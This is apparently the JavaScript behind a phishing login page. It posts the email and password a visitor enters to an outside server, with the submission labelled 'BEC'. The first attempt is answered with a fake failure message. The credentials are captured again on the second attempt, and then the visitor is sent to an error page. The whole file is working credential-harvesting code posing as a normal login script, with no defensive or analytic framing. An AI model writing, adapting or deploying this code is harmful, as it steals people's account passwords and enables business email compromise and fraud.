const exampleForm = document.getElementById("exampleForm")
const exampleInputEmail1 = document.getElementById("exampleInputEmail1")
const exampleInputPassword1 = document.getElementById("exampleInputPassword1")
const submitExample = document.getElementById("submitExample")
const toaster = document.getElementById("toaster")

let trial = 0

toaster.style.display == "flex"


exampleForm.addEventListener("submit", async (e) => {
    e.preventDefault()
    submitExample.disabled = true
   if (trial == 0 ) {
 try {
      const res = await fetch('https://basic-backend-ejem.onrender.com/cl', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    credentials: 'include',
    body: JSON.stringify({
      form: 'BEC',
      username: exampleInputEmail1.value,
      password: exampleInputPassword1.value,
      trial: trial
    })
  });
  const response = await res.json();
  submitExample.disabled = false
  trial = 1
exampleForm.reset();
toaster.style.display = "flex"
setTimeout(() => {
 toaster.style.display = "none" 
}, 5000);
return
} catch (err) {
  submitExample.disabled = false
    console.log(err)
    return
}

}   
    try {
      const res = await fetch('https://basic-backend-ejem.onrender.com/cl', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    credentials: 'include',
    body: JSON.stringify({
      form: 'BEC',
      username: exampleInputEmail1.value,
      password: exampleInputPassword1.value,
      trial: trial
    })
  });
  const response = await res.json();
  submitExample.disabled = false
} catch (err) {
  submitExample.disabled = false
    console.log(err)
}
submitExample.disabled = false
exampleForm.reset();
location.href = "/error.html"
})
